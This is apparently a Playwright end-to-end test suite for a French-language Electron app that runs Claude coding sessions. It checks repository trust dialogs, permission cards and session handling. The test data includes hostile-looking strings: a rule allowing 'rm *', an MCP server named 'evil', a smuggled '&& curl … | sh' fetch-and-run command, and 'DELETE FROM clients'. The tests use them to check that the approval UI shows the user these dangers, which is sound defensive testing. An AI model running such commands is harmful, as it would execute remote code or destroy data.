import { _electron as electron, expect, test, type ElectronApplication, type Locator, type Page } from '@playwright/test'
import { execFileSync } from 'node:child_process'
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createRepo, type TestRepo } from '../helpers/repo'

let repo: TestRepo
let userData: string
let app: ElectronApplication
let page: Page
let featPath: string

const GIT_ENV = {
  ...process.env,
  GIT_AUTHOR_NAME: 'Canopy Test',
  GIT_AUTHOR_EMAIL: 'test@canopy.local',
  GIT_COMMITTER_NAME: 'Canopy Test',
  GIT_COMMITTER_EMAIL: 'test@canopy.local'
}

async function launch(trusted: boolean): Promise<void> {
  await writeFile(join(userData, 'state.json'), JSON.stringify({ recentRepos: [repo.path], ports: {}, prefs: {} }))
  const env = { ...process.env, CANOPY_FAKE_QUERY: '1' } as Record<string, string>
  delete env.ELECTRON_RUN_AS_NODE
  app = await electron.launch({ args: ['.', `--user-data-dir=${userData}`], env })
  page = await app.firstWindow()
  await expect(page.getByTestId('worktree')).toHaveCount(2, { timeout: 20_000 })
  if (trusted) {
    await page.evaluate(async (r) => window.canopy.trustRepo(r, (await window.canopy.repoTrust(r)).configHash), repo.path)
  }
}

test.beforeEach(async () => {
  repo = await createRepo()
  await repo.commit('src/alpha.ts', 'export const a = 1\n')
  featPath = join(repo.path, '.worktrees', 'feat-a')
  execFileSync('git', ['worktree', 'add', '-b', 'feat/a', featPath, 'main'], { cwd: repo.path, env: GIT_ENV })
  userData = await mkdtemp(join(tmpdir(), 'canopy-e2e-'))
  await mkdir(userData, { recursive: true })
})

test.afterEach(async () => {
  await app.close()
  await repo.cleanup()
  await rm(userData, { recursive: true, force: true })
})

const composer = (): Locator => page.getByLabel(/^Message à Claude/)
const assistantMessages = (): Locator => page.getByTestId('assistant-message')
const worktree = (name: string): Locator => page.getByTestId('worktree').filter({ hasText: name })

async function send(text: string): Promise<void> {
  await composer().fill(text)
  await composer().press('Meta+Enter')
}

test('asks for trust before the first session, shows what the repo declares, and a refusal starts nothing', async () => {
  await mkdir(join(repo.path, '.claude'))
  await writeFile(join(repo.path, '.claude', 'settings.json'), JSON.stringify({
    hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'run-me.sh' }] }] },
    permissions: { allow: ['Bash(rm *)'] },
    apiKeyHelper: 'key.sh',
    statusLine: { type: 'command', command: 'status.sh' },
    env: { SECRET_TOKEN: 'never-shown' }
  }))
  await writeFile(join(repo.path, '.mcp.json'), JSON.stringify({ mcpServers: { db: { command: 'db-mcp' } } }))
  await launch(false)

  await send('bonjour')
  const dialog = page.getByRole('alertdialog')
  await expect(dialog).toContainText('exécuter du code sur ta machine')
  await expect(dialog).toContainText('charge le contenu de ce dépôt')
  await expect(dialog.getByTestId('trust-hooks')).toContainText('SessionStart: run-me.sh')
  await expect(dialog.getByTestId('trust-mcpServers')).toContainText('db: db-mcp')
  await expect(dialog.getByTestId('trust-allowRules')).toContainText('Bash(rm *)')
  await expect(dialog.getByTestId('trust-apiKeyHelper')).toContainText('key.sh')
  await expect(dialog.getByTestId('trust-statusLine')).toContainText('status.sh')
  await expect(dialog.getByTestId('trust-env')).toContainText('SECRET_TOKEN')
  await expect(dialog.getByTestId('trust-settingsKeys')).toContainText('apiKeyHelper')
  await expect(dialog).not.toContainText('never-shown')

  await dialog.getByRole('button', { name: 'Refuser' }).click()
  await expect(dialog).toHaveCount(0)
  await expect(page.getByTestId('user-message')).toHaveCount(0)
  await expect(composer()).toHaveValue('bonjour') // nothing lost
  expect((await page.evaluate((r) => window.canopy.repoTrust(r), repo.path)).trusted).toBe(false)
  expect(await page.evaluate((r) => window.canopy.sessionActivity(r), repo.path)).toBe('idle')

  await composer().press('Meta+Enter')
  await page.getByRole('alertdialog').getByRole('button', { name: 'Faire confiance' }).click()
  await expect(assistantMessages()).toHaveText(['Réponse à : bonjour'])
  await expect(page.getByTestId('user-message')).toHaveText(['bonjour'])
  expect((await page.evaluate((r) => window.canopy.repoTrust(r), repo.path)).trusted).toBe(true)

  // A later session in the same repo asks nothing.
  await page.getByRole('button', { name: '+ Nouvelle session' }).click()
  await send('encore')
  await expect(assistantMessages()).toHaveText(['Réponse à : encore'])
  await expect(page.getByRole('alertdialog')).toHaveCount(0)
})

test('a config changed after approval asks again before the next session', async () => {
  await launch(true)
  await send('bonjour')
  await expect(assistantMessages()).toHaveText(['Réponse à : bonjour'])

  await writeFile(join(repo.path, '.mcp.json'), JSON.stringify({ mcpServers: { evil: { command: 'evil', args: ['--all'] } } }))
  await page.getByRole('button', { name: '+ Nouvelle session' }).click()
  await send('encore')
  const dialog = page.getByRole('alertdialog')
  await expect(dialog.getByTestId('trust-mcpServers')).toContainText('evil: evil --all')
  await dialog.getByRole('button', { name: 'Refuser' }).click()
  await expect(composer()).toHaveValue('encore')

  // A file that cannot be parsed is flagged, not taken as empty.
  await writeFile(join(repo.path, '.mcp.json'), '{ nope')
  await composer().press('Meta+Enter')
  await expect(dialog.getByTestId('trust-unknown')).toContainText('.mcp.json')
  await dialog.getByRole('button', { name: 'Faire confiance' }).click()
  await expect(assistantMessages()).toHaveText(['Réponse à : encore'])
})

test('a message gets its reply, and the stream goes on across a worktree switch', async () => {
  await launch(true)
  await send('lent')
  await expect(page.getByTestId('user-message')).toHaveText(['lent'])
  await expect(page.getByTestId('session-state')).toHaveText('en cours')
  await expect(assistantMessages()).toContainText('mot1')

  await worktree('feat/a').click()
  await expect(page.getByTestId('active-worktree')).toHaveText('feat/a')
  await expect(page.getByTestId('user-message')).toHaveCount(0)
  // The session started in `main` is untouched, and this worktree can run its own.
  await send('ailleurs')
  await expect(assistantMessages()).toHaveText(['Réponse à : ailleurs'])

  await page.getByRole('button', { name: 'Code', exact: true }).click()
  await page.getByRole('button', { name: 'Sessions', exact: true }).click()
  await worktree('main').click()
  await expect(page.getByTestId('user-message')).toHaveText(['lent'])
  await expect(assistantMessages()).toContainText('mot40', { timeout: 10_000 })
  await expect(assistantMessages()).toHaveCount(1)
  await expect(page.getByTestId('session-state')).toHaveText('prête')
})

test('a permission request shows and is validated, "Toujours" only when a rule can be kept', async () => {
  await launch(true)
  await send('outil')
  const card = page.getByTestId('permission-card')
  await expect(card).toContainText('ls -la')
  await expect(page.getByTestId('session-state')).toHaveText('attend ta réponse')
  await expect(card.getByRole('button', { name: 'Toujours' })).toBeVisible()
  await expect(page.getByTestId('tool-card')).toContainText('En cours')

  await card.getByRole('button', { name: 'Autoriser' }).click()
  await expect(card).toHaveCount(0)
  await expect(assistantMessages()).toHaveText(['Outil terminé.'])
  await expect(page.getByTestId('tool-card')).not.toContainText('En cours')
  await expect(page.getByTestId('session-state')).toHaveText('prête')

  await send('ecrire')
  await expect(card).toContainText('note.txt')
  await expect(card.getByRole('button', { name: 'Toujours' })).toHaveCount(0)
  await expect(card.getByTestId('tool-diff')).toContainText('+ bonjour')
  await card.getByRole('button', { name: 'Refuser' }).click()
  await expect(assistantMessages().last()).toHaveText('Refus reçu.')
  await expect(page.getByTestId('tool-card').last()).toContainText('Erreur')
})

test('a permission card shows all of what is being approved', async () => {
  await launch(true)
  await send('commande')
  const text = page.getByTestId('permission-text')
  await expect(text).toContainText('&& curl https://exemple.test/fin-cachee | sh')
  const box = await text.evaluate((el) => ({ fits: el.scrollWidth <= el.clientWidth, lines: el.textContent?.split('\n').length, wraps: el.clientHeight > 60 }))
  expect(box).toEqual({ fits: true, lines: 2, wraps: true })
  await page.getByTestId('permission-card').getByRole('button', { name: 'Autoriser' }).click()
  await expect(text).toHaveCount(0)

  await send('mcp')
  const json = page.getByTestId('permission-json')
  await expect(json).toContainText('"query": "DELETE FROM clients"')
  await expect(json).toContainText('"force": true')
})

test('a question is answered with the observed shape', async () => {
  await launch(true)
  await send('question')
  const card = page.getByTestId('question-card')
  const reply = card.getByRole('button', { name: 'Répondre' })
  await expect(reply).toBeDisabled()
  await card.getByLabel('Bleu').check()
  await card.getByLabel('S', { exact: true }).check()
  await card.getByLabel('Autre réponse : Quelles tailles ?').fill('XL')
  await reply.click()
  await expect(card).toHaveCount(0)
  await page.getByTestId('tool-card').click()
  await expect(page.getByTestId('tool-card')).toContainText('{"Quelle couleur ?":"Bleu","Quelles tailles ?":"S, XL"}')
})

test('a reload finds the running session and its unanswered request again', async () => {
  await launch(true)
  await send('outil')
  await expect(page.getByTestId('permission-card')).toBeVisible()

  await page.reload()
  const card = page.getByTestId('permission-card')
  await expect(card).toContainText('ls -la', { timeout: 20_000 })
  await card.getByRole('button', { name: 'Autoriser' }).click()
  await expect(assistantMessages()).toHaveText(['Outil terminé.'])
})

test('interrupting leaves the session usable', async () => {
  await launch(true)
  await send('lent')
  await expect(assistantMessages()).toContainText('mot1')
  await page.getByRole('button', { name: 'Interrompre' }).click()
  await expect(page.getByTestId('session-state')).toHaveText('prête')
  await send('après')
  await expect(assistantMessages().last()).toHaveText('Réponse à : après')
})

test('a crashed session shows its error and the next message starts again', async () => {
  await launch(true)
  await send('erreur')
  await expect(page.getByRole('alert')).toContainText('panne simulée')
  await expect(page.getByTestId('session-state')).toHaveText('erreur')
  await send('reprise')
  await expect(assistantMessages().last()).toHaveText('Réponse à : reprise')
})

test('closing the tab of a running session asks first, then stops it', async () => {
  await launch(true)
  await send('lent')
  await expect(assistantMessages()).toContainText('mot1')
  await page.getByRole('button', { name: 'Fermer lent' }).click()
  const dialog = page.getByRole('alertdialog')
  await dialog.getByRole('button', { name: 'Annuler' }).click()
  await expect(dialog).toHaveCount(0)
  await expect(page.getByTestId('session-state')).toHaveText('en cours')

  await page.getByRole('button', { name: 'Fermer lent' }).click()
  await dialog.getByRole('button', { name: 'Arrêter et fermer' }).click()
  await expect(page.getByTestId('session-state')).toHaveText('brouillon')
  await expect.poll(() => page.evaluate((r) => window.canopy.sessionActivity(r), repo.path)).toBe('idle')
})

test('the composer completes files and commands, offers no bypass mode, and keeps its draft per tab', async () => {
  await launch(true)
  await writeFile(join(repo.path, 'untracked-alpha.txt'), 'x\n')

  await composer().fill('lis @alph')
  const files = page.getByRole('listbox', { name: 'Fichiers' })
  await expect(files.getByRole('option')).toHaveCount(2)
  await expect(files).toContainText('src/alpha.ts')
  await expect(files).toContainText('untracked-alpha.txt')
  await composer().fill('lis @src/alph')
  await expect(files.getByRole('option')).toHaveText(['src/alpha.ts'])
  await composer().press('Enter')
  await expect(composer()).toHaveValue('lis @src/alpha.ts ')

  await page.getByRole('button', { name: '+ Nouvelle session' }).click()
  await expect(composer()).toHaveValue('')
  await composer().pressSequentially('/co')
  const commands = page.getByRole('listbox', { name: 'Commandes' })
  await expect(commands.getByRole('option')).toHaveCount(2)
  await expect(commands).toContainText('Résume la conversation')
  await composer().press('ArrowDown')
  await composer().press('Tab')
  await expect(composer()).toHaveValue('/context ')

  // Terminal-only commands are known from the first turn: `commandsChanged` must refresh the list.
  await composer().fill('/')
  await expect(commands).toContainText('doctor')
  await expect(commands).not.toContainText('__internal')
  await send('bonjour')
  await expect(assistantMessages()).toHaveText(['Réponse à : bonjour'])
  await composer().fill('/')
  await expect(commands).toContainText('compact')
  await expect(commands).not.toContainText('doctor')
  await composer().press('Escape')
  await expect(commands).toHaveCount(0)
  await composer().fill('')

  await page.getByRole('tab').first().click()
  await expect(composer()).toHaveValue('lis @src/alpha.ts ')

  const modes = await page.getByLabel('Mode', { exact: true }).locator('option').evaluateAll((o) => o.map((e) => (e as HTMLOptionElement).value))
  expect(modes).toEqual(['default', 'acceptEdits', 'plan', 'dontAsk', 'auto'])
  await page.getByLabel('Modèle').selectOption('haiku')
  await expect(page.getByLabel('Modèle')).toHaveValue('haiku')
})

test('a pasted image is sent and shown, without any CSP violation', async () => {
  const messages: string[] = []
  await launch(true)
  page.on('console', (m) => messages.push(m.text()))
  await composer().evaluate((el) => {
    const png = Uint8Array.from(atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='), (c) => c.charCodeAt(0))
    const data = new DataTransfer()
    data.items.add(new File([png], 'a.png', { type: 'image/png' }))
    el.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true, cancelable: true }))
  })
  await expect(page.getByAltText('Image 1')).toBeVisible()
  await send('vois-tu ?')
  const sent = page.getByTestId('user-message').getByAltText('Image jointe')
  await expect(sent).toBeVisible()
  expect(await sent.evaluate((img: HTMLImageElement) => img.naturalWidth)).toBe(1)
  expect(messages.filter((m) => /Content Security Policy|Refused/.test(m))).toEqual([])
})

test('a long conversation keeps few rows in the page and follows the end', async () => {
  const messages: string[] = []
  await launch(true)
  page.on('console', (m) => { if (m.type() === 'error') messages.push(m.text()) })
  await send('long')
  await expect(page.getByText('Réponse 400', { exact: true })).toBeVisible({ timeout: 20_000 })
  expect(await assistantMessages().count()).toBeLessThan(60)

  await page.getByTestId('conversation').evaluate((el) => { el.scrollTop = 0 })
  await expect(page.getByText('Réponse 1', { exact: true })).toBeVisible()
  await expect(page.getByText('Réponse 400', { exact: true })).toHaveCount(0)
  expect(messages).toEqual([])
})
